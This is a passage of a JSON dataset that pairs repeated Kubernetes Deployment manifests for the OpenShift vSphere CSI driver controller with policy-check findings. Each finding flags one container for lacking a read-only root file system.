vmware-vsphere-csi-driver-controller-metrics-serving-cert\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"csi-liveness-probe\" does not have a read-only root file system"
  },
  {
    "id": "8977",
    "manifest_path": "data/manifests/the_stack_sample/sample_3389.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: vmware-vsphere-csi-driver-controller\n  namespace: openshift-cluster-csi-drivers\n  annotations:\n    config.openshift.io/inject-proxy: csi-driver\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: vmware-vsphere-csi-driver-controller\n  template:\n    metadata:\n      labels:\n        app: vmware-vsphere-csi-driver-controller\n    spec:\n      serviceAccountName: vmware-vsphere-csi-driver-controller-sa\n      containers:\n      - name: csi-driver\n        image: ${DRIVER_IMAGE}\n        args:\n        - --fss-name=internal-feature-states.csi.vsphere.vmware.com\n        - --fss-namespace=$(CSI_NAMESPACE)\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:///var/lib/csi/sockets/pluginproxy/csi.sock\n        - name: X_CSI_MODE\n          value: controller\n        - name: VSPHERE_CSI_CONFIG\n          value: /etc/kubernetes/vsphere-csi-config/cloud.conf\n        - name: LOGGER_LEVEL\n          value: PRODUCTION\n        - name: INCLUSTER_CLIENT_QPS\n          value: '100'\n        - name: INCLUSTER_CLIENT_BURST\n          value: '100'\n        - name: CSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: X_CSI_SERIAL_VOL_ACCESS_TIMEOUT\n          value: 3m\n        - name: X_CSI_SPEC_DISABLE_LEN_CHECK\n          value: 'true'\n        ports:\n        - name: healthz\n          containerPort: 10301\n          protocol: TCP\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        - name: vsphere-csi-config-volume\n          mountPath: /etc/kubernetes/vsphere-csi-config/\n          readOnly: true\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: csi-provisioner\n        image: ${PROVISIONER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --default-fstype=ext4\n        - --v=${LOG_LEVEL}\n        - --leader-election\n        - --http-endpoint=localhost:8202\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: provisioner-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9202\n        - --upstream=http://127.0.0.1:8202/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9202\n          name: provisioner-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-attacher\n        image: ${ATTACHER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --http-endpoint=localhost:8203\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: attacher-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9203\n        - --upstream=http://127.0.0.1:8203/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9203\n          name: attacher-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-resizer\n        image: ${RESIZER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --http-endpoint=localhost:8204\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: resizer-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9204\n        - --upstream=http://127.0.0.1:8204/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9204\n          name: resizer-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-liveness-probe\n        image: ${LIVENESS_PROBE_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --probe-timeout=3s\n        - --health-port=10301\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: vsphere-syncer\n        image: ${VMWARE_VSPHERE_SYNCER_IMAGE}\n        args:\n        - --leader-election\n        - --fss-name=internal-feature-states.csi.vsphere.vmware.com\n        - --fss-namespace=$(CSI_NAMESPACE)\n        env:\n        - name: FULL_SYNC_INTERVAL_MINUTES\n          value: '30'\n        - name: VSPHERE_CSI_CONFIG\n          value: /etc/kubernetes/vsphere-csi-config/cloud.conf\n        - name: LOGGER_LEVEL\n          value: PRODUCTION\n        - name: INCLUSTER_CLIENT_QPS\n          value: '100'\n        - name: INCLUSTER_CLIENT_BURST\n          value: '100'\n        - name: CSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - mountPath: /etc/kubernetes/vsphere-csi-config\n          name: vsphere-csi-config-volume\n          readOnly: true\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: vsphere-csi-config-volume\n        configMap:\n          name: vsphere-csi-config\n      - name: metrics-serving-cert\n        secret:\n          secretName: vmware-vsphere-csi-driver-controller-metrics-serving-cert\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"csi-provisioner\" does not have a read-only root file system"
  },
  {
    "id": "8978",
    "manifest_path": "data/manifests/the_stack_sample/sample_3389.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: vmware-vsphere-csi-driver-controller\n  namespace: openshift-cluster-csi-drivers\n  annotations:\n    config.openshift.io/inject-proxy: csi-driver\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: vmware-vsphere-csi-driver-controller\n  template:\n    metadata:\n      labels:\n        app: vmware-vsphere-csi-driver-controller\n    spec:\n      serviceAccountName: vmware-vsphere-csi-driver-controller-sa\n      containers:\n      - name: csi-driver\n        image: ${DRIVER_IMAGE}\n        args:\n        - --fss-name=internal-feature-states.csi.vsphere.vmware.com\n        - --fss-namespace=$(CSI_NAMESPACE)\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:///var/lib/csi/sockets/pluginproxy/csi.sock\n        - name: X_CSI_MODE\n          value: controller\n        - name: VSPHERE_CSI_CONFIG\n          value: /etc/kubernetes/vsphere-csi-config/cloud.conf\n        - name: LOGGER_LEVEL\n          value: PRODUCTION\n        - name: INCLUSTER_CLIENT_QPS\n          value: '100'\n        - name: INCLUSTER_CLIENT_BURST\n          value: '100'\n        - name: CSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: X_CSI_SERIAL_VOL_ACCESS_TIMEOUT\n          value: 3m\n        - name: X_CSI_SPEC_DISABLE_LEN_CHECK\n          value: 'true'\n        ports:\n        - name: healthz\n          containerPort: 10301\n          protocol: TCP\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        - name: vsphere-csi-config-volume\n          mountPath: /etc/kubernetes/vsphere-csi-config/\n          readOnly: true\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: csi-provisioner\n        image: ${PROVISIONER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --default-fstype=ext4\n        - --v=${LOG_LEVEL}\n        - --leader-election\n        - --http-endpoint=localhost:8202\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: provisioner-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9202\n        - --upstream=http://127.0.0.1:8202/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9202\n          name: provisioner-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-attacher\n        image: ${ATTACHER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --http-endpoint=localhost:8203\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: attacher-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9203\n        - --upstream=http://127.0.0.1:8203/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9203\n          name: attacher-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-resizer\n        image: ${RESIZER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --http-endpoint=localhost:8204\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: resizer-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9204\n        - --upstream=http://127.0.0.1:8204/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9204\n          name: resizer-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-liveness-probe\n        image: ${LIVENESS_PROBE_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --probe-timeout=3s\n        - --health-port=10301\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: vsphere-syncer\n        image: ${VMWARE_VSPHERE_SYNCER_IMAGE}\n        args:\n        - --leader-election\n        - --fss-name=internal-feature-states.csi.vsphere.vmware.com\n        - --fss-namespace=$(CSI_NAMESPACE)\n        env:\n        - name: FULL_SYNC_INTERVAL_MINUTES\n          value: '30'\n        - name: VSPHERE_CSI_CONFIG\n          value: /etc/kubernetes/vsphere-csi-config/cloud.conf\n        - name: LOGGER_LEVEL\n          value: PRODUCTION\n        - name: INCLUSTER_CLIENT_QPS\n          value: '100'\n        - name: INCLUSTER_CLIENT_BURST\n          value: '100'\n        - name: CSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - mountPath: /etc/kubernetes/vsphere-csi-config\n          name: vsphere-csi-config-volume\n          readOnly: true\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: vsphere-csi-config-volume\n        configMap:\n          name: vsphere-csi-config\n      - name: metrics-serving-cert\n        secret:\n          secretName: vmware-vsphere-csi-driver-controller-metrics-serving-cert\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"csi-resizer\" does not have a read-only root file system"
  },
  {
    "id": "8979",
    "manifest_path": "data/manifests/the_stack_sample/sample_3389.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: vmware-vsphere-csi-driver-controller\n  namespace: openshift-cluster-csi-drivers\n  annotations:\n    config.openshift.io/inject-proxy: csi-driver\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: vmware-vsphere-csi-driver-controller\n  template:\n    metadata:\n      labels:\n        app: vmware-vsphere-csi-driver-controller\n    spec:\n      serviceAccountName: vmware-vsphere-csi-driver-controller-sa\n      containers:\n      - name: csi-driver\n        image: ${DRIVER_IMAGE}\n        args:\n        - --fss-name=internal-feature-states.csi.vsphere.vmware.com\n        - --fss-namespace=$(CSI_NAMESPACE)\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:///var/lib/csi/sockets/pluginproxy/csi.sock\n        - name: X_CSI_MODE\n          value: controller\n        - name: VSPHERE_CSI_CONFIG\n          value: /etc/kubernetes/vsphere-csi-config/cloud.conf\n        - name: LOGGER_LEVEL\n          value: PRODUCTION\n        - name: INCLUSTER_CLIENT_QPS\n          value: '100'\n        - name: INCLUSTER_CLIENT_BURST\n          value: '100'\n        - name: CSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: X_CSI_SERIAL_VOL_ACCESS_TIMEOUT\n          value: 3m\n        - name: X_CSI_SPEC_DISABLE_LEN_CHECK\n          value: 'true'\n        ports:\n        - name: healthz\n          containerPort: 10301\n          protocol: TCP\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        - name: vsphere-csi-config-volume\n          mountPath: /etc/kubernetes/vsphere-csi-config/\n          readOnly: true\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: csi-provisioner\n        image: ${PROVISIONER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --default-fstype=ext4\n        - --v=${LOG_LEVEL}\n        - --leader-election\n        - --http-endpoint=localhost:8202\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: provisioner-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9202\n        - --upstream=http://127.0.0.1:8202/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9202\n          name: provisioner-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-attacher\n        image: ${ATTACHER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --http-endpoint=localhost:8203\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: attacher-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9203\n        - --upstream=http://127.0.0.1:8203/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9203\n          name: attacher-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-resizer\n        image: ${RESIZER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --http-endpoint=localhost:8204\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: resizer-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9204\n        - --upstream=http://127.0.0.1:8204/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9204\n          name: resizer-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-liveness-probe\n        image: ${LIVENESS_PROBE_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --probe-timeout=3s\n        - --health-port=10301\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: vsphere-syncer\n        image: ${VMWARE_VSPHERE_SYNCER_IMAGE}\n        args:\n        - --leader-election\n        - --fss-name=internal-feature-states.csi.vsphere.vmware.com\n        - --fss-namespace=$(CSI_NAMESPACE)\n        env:\n        - name: FULL_SYNC_INTERVAL_MINUTES\n          value: '30'\n        - name: VSPHERE_CSI_CONFIG\n          value: /etc/kubernetes/vsphere-csi-config/cloud.conf\n        - name: LOGGER_LEVEL\n          value: PRODUCTION\n        - name: INCLUSTER_CLIENT_QPS\n          value: '100'\n        - name: INCLUSTER_CLIENT_BURST\n          value: '100'\n        - name: CSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - mountPath: /etc/kubernetes/vsphere-csi-config\n          name: vsphere-csi-config-volume\n          readOnly: true\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: vsphere-csi-config-volume\n        configMap:\n          name: vsphere-csi-config\n      - name: metrics-serving-cert\n        secret:\n          secretName: vmware-vsphere-csi-driver-controller-metrics-serving-cert\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"provisioner-kube-rbac-proxy\" does not have a read-only root file system"
  },
  {
    "id": "8980",
    "manifest_path": "data/manifests/the_stack_sample/sample_3389.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: vmware-vsphere-csi-driver-controller\n  namespace: openshift-cluster-csi-drivers\n  annotations:\n    config.openshift.io/inject-proxy: csi-driver\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: vmware-vsphere-csi-driver-controller\n  template:\n    metadata:\n      labels:\n        app: vmware-vsphere-csi-driver-controller\n    spec:\n      serviceAccountName: vmware-vsphere-csi-driver-controller-sa\n      containers:\n      - name: csi-driver\n        image: ${DRIVER_IMAGE}\n        args:\n        - --fss-name=internal-feature-states.csi.vsphere.vmware.com\n        - --fss-namespace=$(CSI_NAMESPACE)\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:///var/lib/csi/sockets/pluginproxy/csi.sock\n        - name: X_CSI_MODE\n          value: controller\n        - name: VSPHERE_CSI_CONFIG\n          value: /etc/kubernetes/vsphere-csi-config/cloud.conf\n        - name: LOGGER_LEVEL\n          value: PRODUCTION\n        - name: INCLUSTER_CLIENT_QPS\n          value: '100'\n        - name: INCLUSTER_CLIENT_BURST\n          value: '100'\n        - name: CSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: X_CSI_SERIAL_VOL_ACCESS_TIMEOUT\n          value: 3m\n        - name: X_CSI_SPEC_DISABLE_LEN_CHECK\n          value: 'true'\n        ports:\n        - name: healthz\n          containerPort: 10301\n          protocol: TCP\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        - name: vsphere-csi-config-volume\n          mountPath: /etc/kubernetes/vsphere-csi-config/\n          readOnly: true\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: csi-provisioner\n        image: ${PROVISIONER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --default-fstype=ext4\n        - --v=${LOG_LEVEL}\n        - --leader-election\n        - --http-endpoint=localhost:8202\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: provisioner-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9202\n        - --upstream=http://127.0.0.1:8202/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9202\n          name: provisioner-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-attacher\n        image: ${ATTACHER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --http-endpoint=localhost:8203\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: attacher-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9203\n        - --upstream=http://127.0.0.1:8203/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9203\n          name: attacher-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-resizer\n        image: ${RESIZER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --http-endpoint=localhost:8204\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: resizer-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9204\n        - --upstream=http://127.0.0.1:8204/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9204\n          name: resizer-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-liveness-probe\n        image: ${LIVENESS_PROBE_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --probe-timeout=3s\n        - --health-port=10301\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: vsphere-syncer\n        image: ${VMWARE_VSPHERE_SYNCER_IMAGE}\n        args:\n        - --leader-election\n        - --fss-name=internal-feature-states.csi.vsphere.vmware.com\n        - --fss-namespace=$(CSI_NAMESPACE)\n        env:\n        - name: FULL_SYNC_INTERVAL_MINUTES\n          value: '30'\n        - name: VSPHERE_CSI_CONFIG\n          value: /etc/kubernetes/vsphere-csi-config/cloud.conf\n        - name: LOGGER_LEVEL\n          value: PRODUCTION\n        - name: INCLUSTER_CLIENT_QPS\n          value: '100'\n        - name: INCLUSTER_CLIENT_BURST\n          value: '100'\n        - name: CSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - mountPath: /etc/kubernetes/vsphere-csi-config\n          name: vsphere-csi-config-volume\n          readOnly: true\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: vsphere-csi-config-volume\n        configMap:\n          name: vsphere-csi-config\n      - name: metrics-serving-cert\n        secret:\n          secretName: vmware-vsphere-csi-driver-controller-metrics-serving-cert\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"resizer-kube-rbac-proxy\" does not have a read-only root file system"
  },
  {
    "id": "8981",
    "manifest_path": "data/manifests/the_stack_sample/sample_3389.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: vmware-vsphere-csi-driver-controller\n  namespace: openshift-cluster-csi-drivers\n  annotations:\n    config.openshift.io/inject-proxy: csi-driver\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: vmware-vsphere-csi-driver-controller\n  template:\n    metadata:\n      labels:\n        app: vmware-vsphere-csi-driver-controller\n    spec:\n      serviceAccountName: vmware-vsphere-csi-driver-controller-sa\n      containers:\n      - name: csi-driver\n        image: ${DRIVER_IMAGE}\n        args:\n        - --fss-name=internal-feature-states.csi.vsphere.vmware.com\n        - --fss-namespace=$(CSI_NAMESPACE)\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:///var/lib/csi/sockets/pluginproxy/csi.sock\n        - name: X_CSI_MODE\n          value: controller\n        - name: VSPHERE_CSI_CONFIG\n          value: /etc/kubernetes/vsphere-csi-config/cloud.conf\n        - name: LOGGER_LEVEL\n          value: PRODUCTION\n        - name: INCLUSTER_CLIENT_QPS\n          value: '100'\n        - name: INCLUSTER_CLIENT_BURST\n          value: '100'\n        - name: CSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: X_CSI_SERIAL_VOL_ACCESS_TIMEOUT\n          value: 3m\n        - name: X_CSI_SPEC_DISABLE_LEN_CHECK\n          value: 'true'\n        ports:\n        - name: healthz\n          containerPort: 10301\n          protocol: TCP\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        - name: vsphere-csi-config-volume\n          mountPath: /etc/kubernetes/vsphere-csi-config/\n          readOnly: true\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: csi-provisioner\n        image: ${PROVISIONER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --default-fstype=ext4\n        - --v=${LOG_LEVEL}\n        - --leader-election\n        - --http-endpoint=localhost:8202\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: provisioner-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9202\n        - --upstream=http://127.0.0.1:8202/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9202\n          name: provisioner-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-attacher\n        image: ${ATTACHER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --http-endpoint=localhost:8203\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: 